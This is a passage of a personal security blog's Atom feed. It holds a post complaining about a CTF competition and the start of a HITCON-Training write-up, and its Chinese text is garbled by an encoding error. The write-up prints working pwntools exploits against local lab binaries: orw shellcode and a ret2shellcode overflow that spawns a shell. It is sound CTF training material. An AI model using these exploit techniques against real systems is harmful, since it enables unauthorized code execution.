        &lt;p&gt;ä¹‹å‰ä¸€ç›´ç”¨æœ‰é“äº‘åšç¬”è®°ï¼Œç„¶è€Œæœ‰é“äº‘çš„åŠŸèƒ½å®åœ¨å¤ªåƒåœ¾äº†ï¼Œå”¯ä¸€å€¼å¾—ç§°èµçš„å°±åªæœ‰å…è´¹ç©ºé—´å¤§å’ŒåŒæ­¥é€Ÿåº¦å¿«äº†ï¼Œä¸æ”¯æŒä»£ç é«˜äº®ï¼Œæœç´¢åŠŸèƒ½åƒåœ¾å¾—æ— æ³•å¿å—ï¼Œæ‰¾ç¬”è®°å…¨é å¤§è„‘æ¨¡ç³Šç´¢å¼•ã€‚æ˜¯æ—¶å€™æ·˜æ±°è¿™ç§åƒåœ¾è½¯ä»¶äº†ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;è‡ªä»å­¦ä¹ äº†ç”¨markdownåšç¬”è®°ä¹‹åï¼Œå°±ä¸€å‘ä¸å¯æ”¶æ‹¾äº†ï¼Œæœ‰é“äº‘
      
    
    </summary>
    
    
      <category term="æ‚" scheme="https://4f-kira.github.io/tags/%E6%9D%82/"/>
    
  </entry>
  
  <entry>
    <title>æŸæ¯”èµ›åæ§½</title>
    <link href="https://4f-kira.github.io/2018/09/07/wangdingbei/"/>
    <id>https://4f-kira.github.io/2018/09/07/wangdingbei/</id>
    <published>2018-09-07T13:41:09.000Z</published>
    <updated>2018-09-07T13:45:38.597Z</updated>
    
    <content type="html"><![CDATA[<p> ä»Šå¹´å‚åŠ äº†ä¸€æ¬¡æŸæ˜¥ç§‹çš„çº¢å¸½æ¯ï¼Œå·²ç»è¢«æ¶å¿ƒäº†ä¸€æ¬¡ï¼Œæƒ³ä¸æƒ³è¿™æ¬¡ç½‘é¼æ¯æ›´åŠ è‚†æ— å¿Œæƒ®ã€‚æœ¬æ¥æ˜¯ä¸æ‰“ç®—å‚åŠ çš„ï¼Œæ‰€ä»¥ä¹Ÿæ²¡è®¤çœŸå‡†å¤‡ã€‚</p><p> <img src="http://ww1.sinaimg.cn/large/6701be31gy1fv1b29wr0nj21400u0q5z.jpg" alt="image"></p><p> <img src="http://ww1.sinaimg.cn/large/6701be31gy1fv1b2jjp0xj21400u00x4.jpg" alt="image"></p><h2 id="åŠå†³èµ›"><a href="#åŠå†³èµ›" class="headerlink" title="åŠå†³èµ›"></a>åŠå†³èµ›</h2><h3 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>   ä¸€é“webä¸‰é“pwnï¼Œwebçš„æƒé™å¾ˆè¿·ï¼Œä¸Šå»å‘ç°ctfçš„è´¦å·æ— æ³•æƒé™ä¿®æ”¹ç½‘ç«™ï¼Œä¸€åº¦æ‡µé€¼ï¼Œè¿˜å¥½ç»†å¿ƒçš„é˜Ÿå‹å‘ç°å¯ä»¥<code>su apache</code>ã€‚å¥½å½©webæ²¡é¢„ç•™æ— è„‘ä¸€å¥è¯ï¼Œä¸è‡³äºä¸€ä¸Šæ¥å°±è¢«ä¸Šä¸æ­»é©¬ï¼ˆå‚è€ƒä»Šå¹´çº¢å¸½æ¯ï¼Œç¥ä¸€èˆ¬çš„é€Ÿåº¦ï¼‰ã€‚æœ¬ç»„å®åŠ›è¾ƒå¼±ï¼Œwebå¾ˆè¿Ÿæ‰æœ‰é˜Ÿä¼æ‹¿ä¸€è¡€ï¼Œåé¢æŠ“åˆ°åˆ«äººçš„æµé‡ç›´æ¥æ‰“å›å»äº†ï¼Œä¸è¿‡è„šæœ¬æ²¡å‡†å¤‡å¥½ï¼Œé‡æ”¾é€Ÿåº¦æœ‰ç‚¹æ…¢ã€‚åé¢çœ‹pwné¢˜ï¼Œå‘ç°ä¸€é“æ˜¯åŸé¢˜ï¼Œå°±æ˜¯æ”¹äº†ä¸€ä¸‹æè¿°è€Œå·²ï¼Œç„¶è€Œgameboxç”¨çš„æ˜¯centosï¼Œdumpä¸‹libcæ”¾åœ¨ubuntuï¼Œæ­»æ´»è¿è¡Œä¸èµ·æ¥ï¼Œæ— æ³•åŠ¨æ€è°ƒè¯•ï¼Œä¸­é€”ä¸€åº¦æƒ³æ”¾å¼ƒæ²»ç–—ï¼Œåæ¥æ¢äº†ä¸ªå§¿åŠ¿ï¼Œå‘ç°ç«Ÿç„¶æˆåŠŸgetshelläº†ï¼Œå¾ˆå¹¸è¿çš„æ‹¿ä¸‹äº†pwnçš„ä¸€è¡€ã€‚ç„¶è€Œè‡ªåŠ¨æäº¤çš„è„šæœ¬æ•ˆæœä¸ä½³ï¼Œå¯¼è‡´æœ‰ä¸€åŠçš„flagéƒ½æ²¡äº¤ä¸Šï¼Œæœ‰å‡ è½®ç”šè‡³ä¸€ä¸ªéƒ½æ²¡æäº¤ï¼Œåæ¥å‘ç°ä¸è¿˜å¦‚ç”¨burpè·‘ç¨³å®šã€‚ä¹‹åï¼Œæœ‰é˜Ÿä¼åšå‡ºäº†å…¶ä½™ä¸¤é¢˜pwnï¼Œå…¶ä¸­ä¸€é¢˜æˆåŠŸæŠ“åˆ°æµé‡ï¼Œç”±äºä¸€ä¸ªä½çº§é”™è¯¯ï¼Œå¤ç°æ—¶é—´è¿‡é•¿ï¼Œå¯¼è‡´è¢«åˆ«äººæŠ›ç¦»äº†ï¼Œå¦å¤–ä¸€é¢˜æµé‡æ²¡æŠ“é½ï¼Œä¹‹åå†è¡¥å§ã€‚</p><h3 id="åæ§½"><a href="#åæ§½" class="headerlink" title="åæ§½"></a>åæ§½</h3><p>  æ‹¿åˆ°pwnä¹‹åï¼Œæœ¬ä»¥ä¸ºå¯ä»¥è½»æ¾æ‰“å…¨åœºï¼Œä½†æ˜¯å‘ç°åæ¥èƒ½æ‰“åˆ°çš„åª10å¤šé˜Ÿï¼Œå¾ˆå¤šç›´æ¥æ˜¯ç«¯å£éƒ½ä¸é€šï¼Œä¹Ÿä¸è§æœ‰æœåŠ¡downæ‰£åˆ†çš„æƒ…å†µï¼Œä¸Šé€šé˜²æˆ‘å°±è®¤äº†ï¼Œç«¯å£ä¸é€šéƒ½ä¸ç®—æœåŠ¡å¼‚å¸¸ï¼Ÿï¼é˜Ÿå‹ä¸¾æ‰‹æ‰¾è£åˆ¤æŠ•è¯‰ï¼Œåé¢ä¹Ÿä¸äº†äº†ä¹‹ã€‚äº‹åçœ‹çŸ¥ä¹åæ§½ï¼Œä¼°è®¡åŠå†³èµ›è¿checkéƒ½æ²¡æœ‰ï¼Œç›´æ¥åˆ ç«™ï¼Œåˆ ELFå®Œäº‹ã€‚</p><h2 id="å†³èµ›"><a href="#å†³èµ›" class="headerlink" title="å†³èµ›"></a>å†³èµ›</h2><h3 id="è¿‡ç¨‹-1"><a href="#è¿‡ç¨‹-1" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>  æ—¶é—´æ²¡åˆ°ï¼Œå‘ç°å°±èƒ½ç™»gameboxäº†ï¼Œç„¶è€Œå¿«å¼€å§‹äº†æœ‰æ— ç¼˜æ— æ•…æ–­æ‰äº†ï¼Œçœ‹åˆ°æ—è¾¹çš„å¸ˆå‚…å·²ç»å‡†å¤‡è„šæœ¬æ‰“è¿‡ï¼Œç‘Ÿç‘Ÿå‘æŠ–ã€‚ç½‘ç»œè¿é€šåï¼Œå‘ç°webé¢˜è·Ÿæ˜¨å¤©çš„ä¸€æ¯›ä¸€æ ·ï¼Œæœ‰ä¸€é¢˜pwnä¹Ÿæ˜¯ï¼ˆè¿™ä¹ˆçœé’±å—ï¼Ÿï¼‰ï¼Œæ‰‹è„šå¤ªæ…¢ï¼Œæ²¡æŠŠæ¡ä½æœºä¼šæ‹¿åˆ†ï¼ŒæŸå¤±æƒ¨é‡ã€‚è¿˜æœ‰ä¸€ä¸ªå™©è€—æ˜¯ï¼Œæ˜¨å¤©é€šé˜²pwnçš„æ–¹æ³•ä¸è¡Œäº†ï¼ˆçœ‹æ¥æ˜¨æ™šåŠ ç­å†™checkeräº†ï¼‰ï¼ŒæœåŠ¡å¼‚å¸¸æ‰£äº†å¾ˆå¤šåˆ†ã€‚åæ¬¡ä¸€åº¦åˆ°30+ï¼Œåæ¥ç¨³ä½ä¹‹åï¼Œé æ˜¨å¤©çš„è„šæœ¬ï¼Œæ…¢æ…¢çš„æ‰“å›æ¥äº†ï¼Œwebé¢˜ä¹ŸæŠ“åˆ°Venenof7å¸ˆå‚…çš„æµé‡ï¼Œä¹ŸæˆåŠŸå›æ”¾æ‹¿äº†ä¸å°‘flagï¼Œpwné¢˜è°ƒæ•´äº†ä¸€ä¸‹è„šæœ¬ï¼Œå¯ä»¥ç¨³å®š15+ä¸ªflagï¼Œä¸¤é¢˜åŠ èµ·æ¥æœ‰30+ä¸ªflagï¼Œæ’åä¹Ÿç¨³æ­¥å‰è¿›ã€‚å½“æˆ‘ä»¥ä¸ºå¯ä»¥è‹Ÿä½çš„æ—¶å€™ï¼Œæ¥è‡ªä¸œæ–¹çš„ç¥ç§˜åŠ›é‡å‡ºç°äº†ï¼Œgameboxå¼€å§‹è¢«æ‰“äº†ï¼Œæ¯è½®éƒ½ä¼šè¢«éšæœºæ‰“ä¸€ä¸¤ä¸ªï¼Œå¼€å§‹æ‰‹å¿™è„šä¹±åœ°å»ä¿®å¤ï¼Œä¸å°å¿ƒè¿˜å¯¼è‡´æœåŠ¡downäº†å‡ æ¬¡ï¼Œç¬é—´å´©ç›˜ã€‚äº‹åå‘ç°ï¼Œå…¶å®æ ¹æœ¬æ²¡å¿…è¦ä¿®å¤ï¼Œä¸€åˆ‡éƒ½æ˜¯å‘½è¿çš„å®‰æ’ï¼ˆä¸ä¾¿å¤šè¯´ï¼‰ã€‚èµ›åå‘ç°pwné¢˜å…¶å®ä¸éš¾ï¼Œæ²¡èŠ±ç²¾åŠ›å»æä¸€ä¸‹ç¡®å®å¤ªäºäº†ï¼ŒæŠ€ä¸å¦‚äººï¼Œç”˜æ‹œä¸‹é£ã€‚</p><h3 id="åæ§½-1"><a href="#åæ§½-1" class="headerlink" title="åæ§½"></a>åæ§½</h3><p>  å†³èµ›ç»ˆäºä½“éªŒäº†ä¸€æŠŠä»€ä¹ˆå«ç¥ä»™æ‰“æ¶ï¼Œä»€ä¹ˆ0dayæ‹¿flagï¼Œä»€ä¹ˆå«è¢«å®‰æ’å¾—æ˜æ˜ç™½ç™½ã€‚è¿˜æ˜¯å¥½å¥½å­¦ä¹ å§ï¼Œæå‡ä¸‹æŠ€æœ¯ï¼Œåƒäººå®¶eeeï¼ŒNU1lï¼Œ0x300é‚£ä¹ˆå¼ºåŠ²ï¼Œåˆ«äººä¹Ÿå®‰æ’ä¸äº†ä½ ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; ä»Šå¹´å‚åŠ äº†ä¸€æ¬¡æŸæ˜¥ç§‹çš„çº¢å¸½æ¯ï¼Œå·²ç»è¢«æ¶å¿ƒäº†ä¸€æ¬¡ï¼Œæƒ³ä¸æƒ³è¿™æ¬¡ç½‘é¼æ¯æ›´åŠ è‚†æ— å¿Œæƒ®ã€‚æœ¬æ¥æ˜¯ä¸æ‰“ç®—å‚åŠ çš„ï¼Œæ‰€ä»¥ä¹Ÿæ²¡è®¤çœŸå‡†å¤‡ã€‚&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://ww1.sinaimg.cn/large/6701be31gy1fv1b29wr0nj21400u0q5
      
    
    </summary>
    
    
      <category term="åæ§½" scheme="https://4f-kira.github.io/tags/%E5%90%90%E6%A7%BD/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon-Training-Writeup</title>
    <link href="https://4f-kira.github.io/2018/07/11/hitcontraining/"/>
    <id>https://4f-kira.github.io/2018/07/11/hitcontraining/</id>
    <published>2018-07-11T02:51:45.000Z</published>
    <updated>2018-07-11T03:10:28.928Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Outline"><a href="#Outline" class="headerlink" title="Outline"></a>Outline</h3><ul><li>Basic Knowledge<ul><li>Introduction<ul><li>Reverse Engineering<ul><li>Static Analysis</li><li>Dynamic Analysis </li></ul></li><li>Exploitation</li><li>Useful Tool<ul><li>IDA PRO</li><li>GDB</li><li>Pwntool</li></ul></li><li>lab 1 - sysmagic</li></ul></li><li>Section</li><li>Compile,linking,assmbler</li><li>Execution<ul><li>how program get run</li><li>Segment </li></ul></li><li>x86 assembly<ul><li>Calling convention </li><li>lab 2 - open/read/write</li><li>shellcoding</li></ul></li></ul></li><li>Stack Overflow<ul><li>Buffer Overflow</li><li>Return to Text/Shellcode<ul><li>lab 3 - ret2shellcode </li></ul></li><li>Protection<ul><li>ASLR/DEP/PIE/StackGuard</li></ul></li><li>Lazy binding</li><li>Return to Library<ul><li>lab 4 - ret2lib </li></ul></li></ul></li><li>Return Oriented Programming<ul><li>ROP<ul><li>lab 5 - simple rop </li></ul></li><li>Using ROP bypass ASLR<ul><li>ret2plt</li></ul></li><li>Stack migration<ul><li>lab 6 - migration</li></ul></li></ul></li><li>Format String Attack<ul><li>Format String </li><li>Read from arbitrary memory<ul><li>lab 7 - crack</li></ul></li><li>Write to arbitrary memory<ul><li>lab 8 - craxme</li></ul></li><li>Advanced Trick<ul><li>EBP chain </li><li>lab 9 - playfmt </li></ul></li></ul></li><li><p>x64 Binary Exploitation</p><ul><li>x64 assembly</li><li>ROP</li><li>Format string Attack</li></ul></li><li><p>Heap exploitation</p><ul><li>Glibc memory allocator overview</li><li>Vulnerablility on heap<ul><li>Use after free<ul><li>lab 10 - hacknote</li></ul></li><li>Heap overflow <ul><li>house of force <ul><li>lab 11 - 1 - bamboobox1</li></ul></li><li>unlink<ul><li>lab 11 - 2 - bamboobox2</li></ul></li></ul></li></ul></li></ul></li><li>Advanced heap exploitation<ul><li>Fastbin attack<ul><li>lab 12 - babysecretgarden </li></ul></li><li>Shrink the chunk</li><li>Extend the chunk<ul><li>lab 13 -  heapcreator</li></ul></li><li>Unsortbin attack<ul><li>lab 14 - magicheap</li></ul></li></ul></li><li>C++ Exploitation<ul><li>Name Mangling </li><li>Vtable fucntion table</li><li>Vector &amp; String</li><li>New &amp; delete</li><li>Copy constructor &amp; assignment operator<ul><li>lab 15 - zoo </li></ul></li></ul></li></ul><h3 id="lab1-sysmagic"><a href="#lab1-sysmagic" class="headerlink" title="lab1-sysmagic"></a>lab1-sysmagic</h3><p>è¿™æ˜¯ä¸€é¢˜é€†å‘ï¼Œåº”è¯¥æ˜¯è®©ä½ å­¦ä¼šé™æ€åˆ†æåŠåŠ¨æ€è°ƒè¯•ã€‚<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Give me maigc :"</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"><span class="keyword">if</span> ( buf == v2 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x30</span>; ++i )</span><br><span class="line">    <span class="built_in">putchar</span>((<span class="keyword">char</span>)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¼ªä»£ç è·ŸåŸCä»£ç éå¸¸ç›¸ä¼¼äº†ï¼Œå°±æ˜¯ç®€å•xorï¼Œé™æ€æ–¹æ³•ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v5 = <span class="string">"Do_you_know_why_my_teammate_Orange_is_so_angry???"</span></span><br><span class="line">v54 = [<span class="number">7</span>, <span class="number">59</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">61</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">40</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">85</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">31</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">28</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">107</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">60</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">76</span>, <span class="number">30</span>, <span class="number">66</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(ord(x)^y) <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(v5,v54)]) <span class="comment">#CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;</span></span><br></pre></td></tr></table></figure></p><p>ä¿®æ”¹ä»£ç æ–¹æ³•ä¿®æ”¹ifçš„åˆ¤æ–­å³å¯ï¼Œ<code>jnz</code>æ”¹<code>jz</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048722                 jz      short loc_8048760 ; Keypatch modified this from:</span><br><span class="line">.text:08048722                                           ;   jnz short loc_8048760</span><br></pre></td></tr></table></figure></p><p>patchåè¿è¡Œ</p><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fsz88hg8mrj20g101y3yf.jpg" alt=""></p><p>gdbåŠ¨æ€è°ƒè¯•ä¹Ÿå¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *get_flag+389  #ä¸‹æ–­ç‚¹</span><br><span class="line">set $eax=$edx    #æ”¹æˆä¸€æ · cmpè‡ªç„¶èƒ½è¿‡</span><br></pre></td></tr></table></figure></p><h3 id="lab2-orw-bin"><a href="#lab2-orw-bin" class="headerlink" title="lab2-orw.bin"></a>lab2-orw.bin</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab2/orw.bin&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give my your shellcode:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç å¾ˆç®€å•ï¼Œè¾“å…¥åå¯ä»¥è¿è¡Œshellcodeï¼Œä½†è¦ç•™æ„ä¸€ä¸‹<code>orw_seccomp()</code>è¿™ä¸ªå‡½æ•°<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">orw_seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, <span class="number">0x60</span>u);</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸ªå‡½æ•°ä¼šé™åˆ¶syscallçš„ä½¿ç”¨ï¼Œæœ¬é¢˜åªèƒ½ç”¨open,read,writeè¿™ä¸‰ä¸ªsyscallæ¥cat flagï¼Œéœ€è¦æ‰‹å·¥è¿›è¡Œshellcodeç¼–å†™ã€‚è°ƒç”¨å¯é€šè¿‡manæŸ¥çœ‹æˆ–åˆ°è¿™ä¸ª<a href="http://syscalls.kernelgrok.com" target="_blank" rel="noopener">ç½‘ç«™</a>æ‰¾<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span>;              <span class="comment">//eax=0x5</span></span><br><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);          <span class="comment">//eax=0x3</span></span><br><span class="line"><span class="keyword">ssize_t</span> write(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);   <span class="comment">//eax=0x4</span></span><br></pre></td></tr></table></figure></p><p>æ‰‹å†™ç‰ˆï¼š<code>fp = open(&quot;flag&quot;,0) -&gt; read(fp,buf,0x30) -&gt; write(1,buf,0x30)</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./orw.bin'</span>)</span><br><span class="line">shellcode=<span class="string">'''</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,0x5</span></span><br><span class="line"><span class="string">push ecx</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">mov ebx,eax</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov ebx,0x3</span></span><br><span class="line"><span class="string">mov dl,0x30</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">mov eax,0x4</span></span><br><span class="line"><span class="string">mov bl,0x1</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>åˆ©ç”¨pwntoolsçš„<code>shellcraft</code>å†™ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode = shellcraft.pushstr(<span class="string">"flag"</span>)  <span class="comment">#flagè·¯å¾„</span></span><br><span class="line">shellcode += shellcraft.open(<span class="string">"esp"</span>)     </span><br><span class="line">shellcode += shellcraft.read(<span class="string">"eax"</span>, <span class="string">"esp"</span>, <span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">"esp"</span>, <span class="number">0x30</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab3-ret2sc"><a href="#lab3-ret2sc" class="headerlink" title="lab3-ret2sc"></a>lab3-ret2sc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab3/ret2sc&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;name, <span class="number">0x32</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Try your best:"</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)gets(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>name</code>å¤„å†™å…¥shellcodeï¼Œè¦†ç›–<code>ret</code>ä¸ºshellcodeåœ°å€ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯é€šè¿‡espå¯»å€çš„ï¼Œå› æ­¤å…·ä½“çš„offsetå¯ä»¥é€šè¿‡è°ƒè¯•æŸ¥çœ‹<br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fszzph2uo0j20fk0280sp.jpg" alt="image"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2sc'</span>)</span><br><span class="line">name = <span class="number">0x804a060</span></span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,asm(shellcraft.sh()))</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,<span class="string">'a'</span>*<span class="number">32</span>+p32(name))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab4-ret2lib"><a href="#lab4-ret2lib" class="headerlink" title="lab4-ret2lib"></a>lab4-ret2lib</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 